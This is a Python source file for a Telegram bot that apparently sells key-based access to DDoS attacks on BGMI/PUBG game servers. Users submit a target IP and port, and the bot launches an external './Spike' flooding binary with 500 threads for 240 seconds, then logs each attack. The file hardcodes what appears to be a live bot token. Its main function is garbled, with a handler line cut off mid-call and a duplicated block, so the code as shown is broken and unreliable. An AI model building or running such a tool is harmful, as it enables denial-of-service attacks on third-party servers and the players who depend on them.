from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess
import threading
import random
import string
import time
import asyncio
from datetime import datetime
import pytz  # Import pytz for timezone handling

# Global variables
attack_running = False
authorized_users = {}  # {user_id: {"expiry_time": expiry_time, "key": key, "redeem_time": redeem_time, "attacks": attack_count}}
keys = {}  # {key: expiry_time}
attack_logs = []  # List to store attack logs

# Define admin ID
ADMIN_ID = 7163028849  # Replace with your admin's Telegram ID

# Define default values
DEFAULT_PACKET_SIZE = 12
DEFAULT_THREADS = 500
MAX_ATTACK_TIME = 240  # in seconds

# Kolkata timezone
KOLKATA_TZ = pytz.timezone('Asia/Kolkata')

# Function to generate random keys
def generate_key(duration):
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    keys[key] = time.time() + duration
    return key

# Parse duration strings (e.g., "1hour", "2days")
def parse_duration(duration_str):
    if 'hour' in duration_str:
        return int(duration_str.replace('hour', '')) * 3600
    elif 'day' in duration_str:
        return int(duration_str.replace('day', '')) * 86400
    return None

# Function to run the attack
def attack(ip, port, context, chat_id, user_id):
    global attack_running

    # Run the attack command
    subprocess.run(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])

    # Log the attack in Kolkata timezone
    attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
    attack_logs.append({
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "time": attack_time
    })

    # Increment attack count for the user
    if user_id in authorized_users:
        authorized_users[user_id]["attacks"] += 1

    # Notify that the attack is finished
    attack_finished_message = (
        f"✅ 𝘈𝘵𝘵𝘢𝘤𝘬 𝘧𝘪𝘯𝘪𝘴𝘩𝘦𝘥!\n\n"
        f"𝗧𝗮𝗿𝗴𝗲𝘁𝗲𝗱 𝗜𝗣: `{ip}`\n"
        f"𝗣𝗼𝗿𝘁: `{port}`\n"
        f"𝗧𝗶𝗺𝗲: `{MAX_ATTACK_TIME} 𝗌𝖾𝖼𝗈𝗇𝖽𝗌`\n"
        f"⏰ �𝘛𝘪𝘮𝘦𝘴𝘵𝘢𝘮𝘱: `{attack_time}`"
    )
    asyncio.run(context.bot.send_message(chat_id=chat_id, text=attack_finished_message, parse_mode="Markdown"))

    # Mark attack as finished
    attack_running = False

# Command: Start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_message = (
        "🚀 *Welcome to BGMI Attack Bot* 🚀\n\n"
        "⚡️ _A powerfull tool to manage DDoS attacks for BGMI/PUBG servers_ ⚡️\n\n"
        "✨ **Key Features:**\n"
        "   • Start attacks with `/bgmi` command\n"
        "   • Key-based authorization system\n"
        "   • Admin controls for key generation\n"
        "   • Real-time attack monitoring\n\n"
        "🔧 **Commands:**\n"
        "   /help - Show all commands\n"
        "   /bgmi - Start attack\n"
        "   /redeem - Activate your key\n\n"
        "👑 **Bot Owner:** [TITAN OP](https://t.me/TITANOP24)\n"
        "⚙️ _Use this bot responsibly!_"
    )
    await update.message.reply_text(start_message, parse_mode="Markdown")

# Command: Show help
async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_message = (
        "🛠️ *Available Commands* 🛠️\n\n"
        "🎮 *Attack Commands:*\n"
        "`/bgmi <ip> <port>` - Start a new attack\n"
        "`/redeem <key>` - Redeem your access key\n\n"
        "🔑 *Admin Commands:*\n"
        "`/genkey <duration>` - Generate single key\n"
        "`/mgenkey <duration> <amount>` - Bulk generate keys\n"
        "`/users` - List authorized users\n"
        "`/logs` - Show attack logs\n"
        "`/broadcast <message>` - Broadcast message to all users\n\n"
        "ℹ️ *Info Commands:*\n"
        "`/start` - Show bot introduction\n"
        "`/help` - Display this message\n\n"
        "👨💻 *Developer:* [@TITANOP24](https://t.me/TITANOP24)\n"
        "🔒 _All attacks are logged and monitored_"
    )
    await update.message.reply_text(help_message, parse_mode="Markdown")

# Command: Start an attack
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    user_id = update.message.from_user.id

    # Check if user is authorized
    if user_id not in authorized_users or time.time() > authorized_users[user_id]["expiry_time"]:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥. 𝘙𝘦𝘥𝘦𝘦𝘮 𝘢 𝘬𝘦𝘺 𝘧𝘪𝘳𝘴𝘵.')
        return

    # Check if an attack is already running
    if attack_running:
        await update.message.reply_text('⏳ 𝘈𝘯𝘰𝘵𝘩𝘦𝘳 𝘢𝘵𝘵𝘢𝘤𝘬 𝘪𝘴 𝘳𝘶𝘯𝘯𝘪𝘯𝘨. 𝘗𝘭𝘦𝘢𝘴𝘦 𝘸𝘢𝘪𝘵 𝘧𝘰𝘳 𝘪𝘵 𝘵𝘰 𝘧𝘪𝘯𝘪𝘴𝘩.')
        return

    # Validate command arguments
    if len(context.args) < 2:
        await update.message.reply_text('Usage: /bgmi <ip> <port>')
        return

    ip, port = context.args[0], context.args[1]
    attack_running = True

    # Send attack details
    attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
    attack_details = (
        f"🚀 𝘈𝘵𝘵𝘢𝘤𝘬 𝘴𝘵𝘢𝘳𝘵𝘦𝘥!\n\n"
        f"𝗧𝗮𝗿𝗴𝗲𝘁𝗲𝗱 𝗜𝗣: `{ip}`\n"
        f"𝗣𝗼𝗿𝘁: `{port}`\n"
        f"𝗧𝗶𝗺𝗲: `{MAX_ATTACK_TIME} 𝗌𝖾𝖼𝗈𝗇𝖽𝗌`\n"
        f"⏰ 𝘛𝘪𝘮𝘦𝘴𝘵𝘢𝘮𝘱: `{attack_time}`"
    )
    await update.message.reply_text(attack_details, parse_mode="Markdown")

    # Run the attack in a separate thread
    threading.Thread(target=attack, args=(ip, port, context, update.message.chat_id, user_id)).start()

# Command: Generate a key (Admin only)
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /genkey <duration>')
        return

    duration = parse_duration(context.args[0])
    if not duration:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
        return

    key = generate_key(duration)
    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺:\n\n`{key}`', parse_mode="Markdown")

# Command: Generate multiple keys (Admin only)
async def mgenkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 2:
        await update.message.reply_text('Usage: /mgenkey <duration> <number>')
        return

    duration = parse_duration(context.args[0])
    if not duration:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
        return

    number = int(context.args[1])
    keys_list = [generate_key(duration) for _ in range(number)]
    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺𝘴:\n\n' + '\n'.join([f'`{key}`' for key in keys_list]), parse_mode="Markdown")

# Command: List authorized users (Admin only)
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    users_list = []
    for user_id, details in authorized_users.items():
        redeem_time = datetime.fromtimestamp(details["redeem_time"], KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        expiry_time = datetime.fromtimestamp(details["expiry_time"], KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        users_list.append(
            f"👤 User ID: `{user_id}`\n"
            f"🔑 Key: `{details['key']}`\n"
            f"⏰ Redeem Time: `{redeem_time}`\n"
            f"⏳ Expiry Time: `{expiry_time}`\n"
            f"🎯 Attacks Done: `{details['attacks']}`\n"
        )
    await update.message.reply_text('📜 𝘈𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘶𝘴𝘦𝘳𝘴:\n\n' + '\n\n'.join(users_list), parse_mode="Markdown")

# Command: Redeem a key
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text('Usage: /redeem <key>')
        return

    key = context.args[0]
    if key not in keys or time.time() > keys[key]:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘰𝘳 𝘦𝘹𝘱𝘪𝘳𝘦𝘥 𝘬𝘦𝘺.')
        return

    authorized_users[update.message.from_user.id] = {
        "expiry_time": keys[key],
        "key": key,
        "redeem_time": time.time(),
        "attacks": 0
    }
    del keys[key]
    await update.message.reply_text('✅ 𝘒𝘦𝘺 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥. 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘸 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 /𝘣𝘨𝘮𝘪.')

# Command: Show attack logs (Admin only)
async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 �𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    logs_list = []
    for log in attack_logs:
        logs_list.append(
            f"👤 User ID: `{log['user_id']}`\n"
            f"🎯 Target IP: `{log['ip']}`\n"
            f"🚪 Port: `{log['port']}`\n"
            f"⏰ Time: `{log['time']}`\n"
        )
    await update.message.reply_text('📜 𝘈𝘵𝘵𝘢𝘤𝘬 𝘭𝘰𝘨𝘴:\n\n' + '\n\n'.join(logs_list), parse_mode="Markdown")

# Command: Broadcast message to all users (Admin only)
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /broadcast <message>')
        return

    message = ' '.join(context.args)
    for user_id in authorized_users:
        await context.bot.send_message(chat_id=user_id, text=f"📢 Broadcast:\n\n{message}")

    await update.message.reply_text('✅ 𝘔𝘦𝘴𝘴𝘢𝘨𝘦 𝘣𝘳𝘰𝘢𝘥𝘤𝘢𝘴𝘵𝘦𝘥 𝘵𝘰 𝘢𝘭𝘭 �𝘶𝘴𝘦𝘳𝘴.')

# Main function to start the bot
def main():
    # Create the Application
    application = Application.builder().token("7413722350:AAEBSrOE31ij_OELB0eFgFTM1EO5r5v0dHs").build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("mgenkey", mgenkey))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(Command

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("mgenkey", mgenkey))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("logs", logs))
    application.add_handler(CommandHandler("broadcast", broadcast))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
